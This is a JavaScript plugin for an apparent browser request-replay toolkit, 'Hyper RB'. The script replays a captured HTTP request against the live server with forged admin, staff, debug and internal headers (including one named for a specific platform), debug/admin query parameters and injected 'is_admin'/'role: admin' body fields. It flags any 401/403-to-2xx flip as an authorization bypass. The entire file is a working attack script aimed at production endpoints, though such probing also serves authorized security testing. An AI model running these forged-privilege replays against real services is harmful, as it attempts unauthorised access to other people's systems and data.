// ============================================================
// Hyper RB · Script #24 · admin-bypass-prober
// Replay de UMA request com bateria de headers/query/body
// "admin/debug/internal" para detectar bypass de autorização.
// Hit = status flipa para 2xx OU bodyHash muda em request 4xx.
// ============================================================
(function registerAdminBypassProber() {
  "use strict";

  const S = window.HYPER_RB_SHARED;
  if (!S) {
    console.error("[Hyper RB · admin-bypass-prober] HYPER_RB_SHARED ausente");
    return;
  }

  const MAX_VARIANTS = 10;
  const SLEEP_MS = 200;

  // Headers comumente honrados por reverse-proxies / gateways internos
  // para flagging de staff/admin/debug. Listagem conservadora — nada
  // que cause efeito colateral fora do endpoint sondado.
  const HEADER_VARIANTS = [
    { label: "x-debug:true",            patch: { "X-Debug": "true", "X-Debug-Mode": "true" } },
    { label: "x-admin:true",            patch: { "X-Admin": "true", "X-Is-Admin": "1" } },
    { label: "x-staff:true",            patch: { "X-Staff": "true", "X-Lovable-Staff": "1" } },
    { label: "x-internal:true",         patch: { "X-Internal": "true", "X-Internal-Request": "1" } },
    { label: "x-forwarded-user:admin",  patch: { "X-Forwarded-User": "admin", "X-Remote-User": "admin" } },
    { label: "x-original-role:admin",   patch: { "X-Original-Role": "admin", "X-User-Role": "admin" } },
    { label: "x-feature-debug:on",      patch: { "X-Feature-Debug": "on", "X-Feature-Flags": "debug_mode,admin" } },
  ];

  function buildBodyMutation(originalBody) {
    if (!originalBody) return null;
    try {
      const parsed = JSON.parse(originalBody);
      if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) return null;
      return JSON.stringify({
        ...parsed,
        is_admin: true,
        role: "admin",
        debug_mode: true,
        admin: true,
      });
    } catch {
      return null; // body não-JSON: pula mutação de body
    }
  }

  function buildQueryMutation(baseUrl) {
    try {
      const u = new URL(baseUrl);
      u.searchParams.set("debug", "1");
      u.searchParams.set("admin", "1");
      u.searchParams.set("debug_mode", "true");
      return u.toString();
    } catch {
      return null;
    }
  }

  function cloneHeaders(headers) {
    const next = {};
    for (const [k, v] of Object.entries(headers || {})) {
      if (S.REPLAY_BLOCKED_HEADERS.has(String(k).toLowerCase())) continue;
      next[k] = v;
    }
    return next;
  }

  function mergePatch(base, patch) {
    const out = cloneHeaders(base);
    for (const [k, v] of Object.entries(patch || {})) {
      if (S.REPLAY_BLOCKED_HEADERS.has(String(k).toLowerCase())) continue;
      out[k] = v;
    }
    return out;
  }

  function buildVariants(req, rawHeaders, rawBody) {
    const variants = [];
    // baseline (replay sem alteração — referência)
    variants.push({
      label: "baseline",
      url: req.url,
      method: req.method,
      headers: cloneHeaders(rawHeaders),
      body: rawBody,
    });
    // header-only
    for (const h of HEADER_VARIANTS) {
      variants.push({
        label: h.label,
        url: req.url,
        method: req.method,
        headers: mergePatch(rawHeaders, h.patch),
        body: rawBody,
      });
    }
    // query mutation
    const qUrl = buildQueryMutation(req.url);
    if (qUrl) {
      variants.push({
        label: "query ?debug=1&admin=1",
        url: qUrl,
        method: req.method,
        headers: cloneHeaders(rawHeaders),
        body: rawBody,
      });
    }
    // body mutation (só se POST/PUT/PATCH com JSON)
    const m = String(req.method || "GET").toUpperCase();
    if (m === "POST" || m === "PUT" || m === "PATCH") {
      const mutated = buildBodyMutation(rawBody);
      if (mutated) {
        variants.push({
          label: "body +{is_admin,role,debug_mode}",
          url: req.url,
          method: req.method,
          headers: cloneHeaders(rawHeaders),
          body: mutated,
        });
      }
    }
    return variants.slice(0, MAX_VARIANTS);
  }

  function classifyResult(baseStatus, result) {
    if (!result.ok && !result.status) return { kind: "error", note: result.error || "falhou" };
    const isAuthFail = baseStatus === 401 || baseStatus === 403;
    const flipped = isAuthFail && result.status >= 200 && result.status < 300;
    const hashChanged = result.bodyHash && result.label !== "baseline";
    if (flipped) return { kind: "bypass", note: `⚠ STATUS FLIP ${baseStatus}→${result.status}` };
    if (result.status >= 200 && result.status < 300 && !isAuthFail && hashChanged) {
      return { kind: "delta", note: "body diferente do baseline" };
    }
    return { kind: "ok", note: result.status === baseStatus ? "igual baseline" : `status ${result.status}` };
  }

  function buildRequestOptions(requests) {
    return requests
      .filter((r) => r && r.url && r.method)
      .slice(0, 80)
      .map((r, i) => ({
        id: r.id,
        label: `${i + 1}. [${r.status || "??"}] ${r.method} ${r.host}${r.pathname || "/"}`,
        request: r,
      }));
  }

  const SCRIPT = {
    id: 24,
    slug: "admin-bypass-prober",
    name: "Sonda de Bypass Admin",
    description: "Replica uma request com headers/query/body de 'admin/debug/internal'. Detecta flip de status 4xx→2xx ou body diferente que sugira bypass de autorização.",
    icon: "🛡️",
    needsAI: false,
    needsNetwork: true,
    minRequests: 1,

    async run(ctx) {
      const reqs = Array.isArray(ctx.requests) ? ctx.requests : [];
      if (!reqs.length) {
        return { ok: false, error: "Capture pelo menos 1 request antes de executar." };
      }
      const options = buildRequestOptions(reqs);
      if (!options.length) {
        return { ok: false, error: "Nenhuma request válida encontrada." };
      }
      return {
        ok: true,
        summary: `${options.length} request(s) elegíveis · até ${MAX_VARIANTS} variantes por execução`,
        render(mountEl) {
          mountEl.innerHTML = `
            <style>
              .abp-wrap{display:flex;flex-direction:column;gap:12px;padding:12px;color:#ececf1;font:12px/1.45 ui-monospace,SFMono-Regular,Menlo,monospace}
              .abp-panel{background:rgba(18,18,20,.7);border:1px solid rgba(255,255,255,.06);border-radius:8px;padding:12px}
              .abp-row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
              .abp-row select{min-width:300px;max-width:100%;padding:8px 10px;border-radius:6px;background:rgba(255,255,255,.04);color:#ececf1;border:1px solid rgba(255,255,255,.08)}
              .abp-btn{padding:8px 12px;border:none;border-radius:6px;background:#bf00ff;color:#0a0a0c;font-weight:900;cursor:pointer}
              .abp-btn[disabled]{opacity:.6;cursor:wait}
              .abp-hint{color:rgba(255,255,255,.55)}
              .abp-table{width:100%;border-collapse:collapse}
              .abp-table th,.abp-table td{padding:7px 9px;border-bottom:1px solid rgba(255,255,255,.06);text-align:left;font-size:11px;vertical-align:top}
              .abp-table th{font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:rgba(255,255,255,.52)}
              .abp-bypass{background:rgba(255,60,60,.18);color:#ff9aac;font-weight:900;padding:1px 6px;border-radius:4px;font-size:10px}
              .abp-delta{background:rgba(255,180,0,.12);color:#ffd27f;font-weight:700;padding:1px 6px;border-radius:4px;font-size:10px}
              .abp-ok{color:rgba(255,255,255,.55)}
              .abp-err{color:#ff9aac}
              .abp-meta{color:rgba(255,255,255,.55);font-size:11px;margin-bottom:8px}
              .abp-warn{padding:8px 10px;background:rgba(255,180,0,.07);border:1px solid rgba(255,180,0,.25);border-radius:6px;font-size:11px;color:#ffd27f}
            </style>
            <div class="abp-wrap">
              <div class="abp-panel">
                <div class="abp-row">
                  <select data-role="req-select">${options.map((o, i) => `<option value="${S.escapeHtml(i)}">${S.escapeHtml(o.label)}</option>`).join("")}</select>
                  <button class="abp-btn" data-action="run">Executar</button>
                  <span class="abp-hint">${MAX_VARIANTS} variantes · ${SLEEP_MS}ms entre · sequencial</span>
                </div>
                <div class="abp-warn" style="margin-top:10px">⚠ Uso responsável: replays atingem o servidor de produção. Não execute em endpoints destrutivos (DELETE, payments, etc.).</div>
              </div>
              <div class="abp-panel">
                <div class="abp-meta" data-role="meta">Selecione uma request e clique Executar.</div>
                <div data-role="results"><div class="abp-ok">Nenhuma execução ainda.</div></div>
              </div>
            </div>`;

          const sel = mountEl.querySelector('[data-role="req-select"]');
          const btn = mountEl.querySelector('[data-action="run"]');
          const meta = mountEl.querySelector('[data-role="meta"]');
          const out = mountEl.querySelector('[data-role="results"]');

          btn.addEventListener("click", async () => {
            const picked = options[Number(sel.value || 0)];
            if (!picked) return;
            btn.disabled = true;
            const req = picked.request;
            meta.textContent = `Sondando ${req.method} ${req.host}${req.pathname || "/"}…`;
            out.innerHTML = `<div class="hyper-rb-loading">Executando variantes…</div>`;
            try {
              let rawHeaders = {};
              let rawBody = null;
              try {
                const raw = await ctx.getRawRequest(req.id);
                if (raw && raw.ok) {
                  rawHeaders = (raw.raw && raw.raw.requestHeaders) || raw.requestHeaders || {};
                  rawBody = (raw.raw && raw.raw.requestBody) || raw.requestBody || null;
                }
              } catch {}

              const variants = buildVariants(req, rawHeaders, rawBody);
              const results = await S.runReplayVariants(ctx, variants, { sleepMs: SLEEP_MS, cap: MAX_VARIANTS });
              const baseline = results.find((r) => r.label === "baseline");
              const baseStatus = baseline ? baseline.status : (req.status || 0);
              const baseHash = baseline ? baseline.bodyHash : "";

              const enriched = results.map((r) => {
                const cls = classifyResult(baseStatus, r);
                const hashChanged = r.bodyHash && baseHash && r.bodyHash !== baseHash && r.label !== "baseline";
                return { ...r, cls, hashChanged };
              });

              const hits = enriched.filter((r) => r.cls.kind === "bypass" || (r.cls.kind === "delta" && r.hashChanged));

              meta.innerHTML = `Baseline: <strong>${S.escapeHtml(baseStatus || "??")}</strong> · hash <code>${S.escapeHtml(baseHash || "—")}</code> · ${enriched.length} variantes executadas · <strong>${hits.length}</strong> achado(s) suspeito(s)`;

              out.innerHTML = `
                <table class="abp-table">
                  <thead><tr><th>Variante</th><th>Status</th><th>Latência</th><th>Hash body</th><th>Diagnóstico</th></tr></thead>
                  <tbody>
                    ${enriched.map((r) => {
                      const badge = r.cls.kind === "bypass"
                        ? `<span class="abp-bypass">BYPASS</span>`
                        : r.cls.kind === "delta" && r.hashChanged
                          ? `<span class="abp-delta">DELTA</span>`
                          : r.cls.kind === "error"
                            ? `<span class="abp-err">erro</span>`
                            : `<span class="abp-ok">ok</span>`;
                      return `<tr>
                        <td>${S.escapeHtml(r.label)}</td>
                        <td>${S.escapeHtml(r.status || "—")}</td>
                        <td>${S.escapeHtml(S.formatMs(r.ms))}</td>
                        <td><code>${S.escapeHtml(r.bodyHash || "—")}</code>${r.hashChanged ? " ⚠" : ""}</td>
                        <td>${badge} <span class="abp-ok">${S.escapeHtml(r.cls.note)}</span></td>
                      </tr>`;
                    }).join("")}
                  </tbody>
                </table>`;
            } catch (e) {
              out.innerHTML = `<div class="hyper-rb-error">${S.escapeHtml((e && e.message) || String(e))}</div>`;
              meta.textContent = "Falha ao executar a sonda.";
            } finally {
              btn.disabled = false;
            }
          });
        },
      };
    },
  };

  window.HYPER_RB_SCRIPTS = window.HYPER_RB_SCRIPTS || [];
  window.HYPER_RB_SCRIPTS.push(SCRIPT);
})();